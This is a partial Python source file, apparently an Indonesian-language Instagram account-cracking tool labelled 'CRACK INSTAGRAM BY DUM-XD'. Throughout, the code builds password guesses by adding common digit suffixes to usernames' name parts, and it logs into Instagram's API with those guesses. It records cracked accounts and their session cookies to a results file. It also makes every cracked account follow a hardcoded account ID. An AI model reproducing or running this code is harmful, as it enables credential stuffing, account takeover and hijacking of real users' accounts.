...
try:
        ...
        os.system(f"apt update && apt upgrade")
...
\t╚═══╩═══╩╝╚╝╚╝╚══╩╝─╚═╩═══╝─╚╝─╚╝─╚╝\n\t{P2}        CRACK INSTAGRAM BY DUM-XD""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    ...
    def cook(self, tok, cok):
        try:
            ...
            self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("9159324159"), headers = head, cookies={"cookie":cok})
        except requests.ConnectionError:
            self.logoo()
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"111", pasw+"222", pasw+"333", pasw+"1324", pasw+"2413", pasw+"112233", pasw+"121", pasw+"122", pasw+"212", pasw+"131", pasw+"133", pasw+"313", pasw+"1111", pasw+"2222", pasw+"3333", pasw+"4444", pasw+"890", pasw+"21802", pasw.lower()]
                        else:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"111", pasw+"222", pasw+"333", pasw+"1324", pasw+"2413", pasw+"112233", pasw+"121", pasw+"122", pasw+"212", pasw+"131", pasw+"133", pasw+"313", pasw+"1111", pasw+"2222", pasw+"3333", pasw+"4444", pasw+"890", pasw+"21802", pasw.lower()]
                        if 'satu' in method:
            ...
            try:
                with requests.Session() as ses:
                    ...
                    data = {
                        ...
                        "username":user,
                        "queryParams":"{}",
                        "optIntoOneTap":"false","stopDeletionNonce":"",
                    ...
                    if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                        ...
                        ngtd = re.search("csrftoken=(.*?);", str(cokis)).group(1)
                        head = {
                            "Host": "i.instagram.com",
                            "content-length": "0",
                            "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                        ...
                        self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("9159324159"), headers = head, cookies={"cookie":cokis})
                        ...
                        kntl = (f"••• [ Live ] ••• {user} | {password} | {pengikut} | {mengikut} | {cokis}")
                        self.ok.append(kntl)
                        ...
                        kntl = (f"••• [ CP ] ••• {user} | {password} | {pengikut} | {mengikut}")
                        self.cp.append(kntl)
                        with open("results/"+AkunOK,"a", encoding="utf-8") as r:
                            r.write(kntl+"\n")
                        break
        ...
        for password in pasw:
            try:
                with requests.Session() as ses:
                    ...
                    times = calendar.timegm(current_GMT)
                    csrftoken = get_token.cookies['csrftoken']
                    headers = {
        ...
        for password in pasw:
            try:
                ...
                if "logged_in_user" in str(kontol) or "sessionid" in ses.cookies.get_dict() or "userId" in str(kontol):
                    ...
                    self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("9159324159"), headers=head1, cookies=cokis)
                    pengikut, mengikut, postingan = self.Ingfo(user)
                    print("\r                                       ")
                    adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uas}\nCookie    : {cokis}'
                    pepekXD = Panel(adit, style=f'#00FF00')
